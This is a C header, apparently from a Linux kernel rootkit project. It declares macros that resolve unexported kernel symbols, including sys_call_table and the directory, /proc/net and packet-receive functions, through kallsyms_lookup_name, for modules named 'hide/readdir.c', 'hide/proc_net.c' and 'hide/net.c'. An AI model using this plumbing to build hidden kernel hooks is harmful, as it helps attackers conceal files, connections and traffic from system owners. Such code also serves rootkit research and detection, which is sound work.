/*
  Access to symbols unexported by the linux kernel for dynamic linking
  with modules.
*/

#pragma once

#include <linux/types.h>
#include <linux/fs.h>
#include <linux/jump_label.h>
#include <linux/netdevice.h>

/// @name KSYMS_FUNCTIONS
/// @brief Centralized definition of unexported kernel functions which are to be resolved
///     and used.
/// @details KSYM_FUNC should be defined before calling this macro, in the form:
///     #define KSYM_FUNC(retn, symbol, ...)
///     When invoking this macro, the KSYM_FUNC will be generated for every defined symbol.
///     This macro is currently used in ksyms.h to extern function pointers for all defined symbols,
///     and in ksyms.c to define the global function pointers and to initialize within resolve_ksyms.
#define KSYMS_FUNCTIONS()     \
/* required by hide/readdir.c */ \
KSYM_FUNC(int, filldir64, struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type); \
KSYM_FUNC(int, verify_dirent_name, const char *name, int len); \
/* required by hide/proc_net.c */ \
KSYM_FUNC(void *, listening_get_next, struct seq_file *seq, void *cur); \
KSYM_FUNC(void *, tcp_get_idx, struct seq_file *seq, loff_t pos); \
KSYM_FUNC(void *, established_get_first, struct seq_file *seq); \
KSYM_FUNC(void *, established_get_next, struct seq_file *seq, void *cur); \
/* required by hide/net.c */ \
KSYM_FUNC(int, get_rps_cpu, struct net_device *dev, struct sk_buff *skb, struct rps_dev_flow **rflowp); \
KSYM_FUNC(int, enqueue_to_backlog, struct sk_buff *skb, int cpu, unsigned int *qtail); \
KSYM_FUNC(int, __netif_receive_skb, struct sk_buff *skb); \
KSYM_FUNC(int, __netif_receive_skb_one_core, struct sk_buff *skb, bool pfmemalloc); \
KSYM_FUNC(void, __netif_receive_skb_list_core, struct list_head *head, bool pfmemalloc); \
KSYM_FUNC(void, netif_receive_skb_list_internal, struct list_head *head);

typedef struct static_key_false static_key_false_t;

/// @name KSYMS_GLOBALS
/// @brief Centralized definition of unexported kernel globals which are to be resolved
///     and used.
/// @details Operates just like KSYMS_FUNCTIONS, however here KSYM_GLOBAL should be defined before calling
///     this macro, and in the form:
///     #define KSYM_GLOBAL(type, symbol)
#define KSYMS_GLOBALS() \
KSYM_GLOBAL(void *, sys_call_table); \
/* required by hide/net.c */ \
KSYM_GLOBAL(static_key_false_t, netstamp_needed_key);

/**
 * Extern all defined kernel functions as function pointers with ksyms__ prepended to their names.
 */
#define KSYM_FUNC(retn, symbol, ...) \
extern retn (*ksyms__##symbol)(__VA_ARGS__);
KSYMS_FUNCTIONS();
#undef KSYM_FUNC

/**
 * Extern all defined kernel globals as pointers to their respective types with ksyms__
 * prepended to their names.
 */
#define KSYM_GLOBAL(type, symbol) \
extern type *ksyms__##symbol;
KSYMS_GLOBALS();
#undef KSYM_GLOBAL

/// @brief Use `kallsyms_lookup_name` to resolve all required unexported symbols
/// @param kallsyms_lookup_name_addr address of the kallsyms_lookup_name_addr unexported symbol
/// @returns 0 on successful resolution of all symbols, non-zero if any resolution failed -
///     in which case an error will be logged and some symbols will remain uninitialized.
int resolve_ksyms(void *kallsyms_lookup_name_addr);

extern unsigned long (*ksyms__kallsyms_lookup_name)(const char *name);
